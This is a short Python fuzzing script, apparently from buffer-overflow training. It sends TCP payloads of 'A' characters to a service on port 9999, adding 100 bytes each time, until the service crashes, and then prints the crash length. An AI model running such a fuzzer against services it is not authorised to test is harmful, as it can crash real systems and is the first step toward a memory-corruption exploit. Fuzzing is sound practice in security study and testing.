#!/usr/bin/python

import sys,socket,time

address = ''
port = 9999

buffer = "A" * 100

while True:

    try:
        payload = buffer + '\r\n'
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((address, port))
        print("[+] Sending the payload...\n " + str(len(buffer)))
        s.send(payload.encode())
        s.close()
        time.sleep(1)
        buffer = buffer + "A" * 100
    except:
        print("[!] Fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()
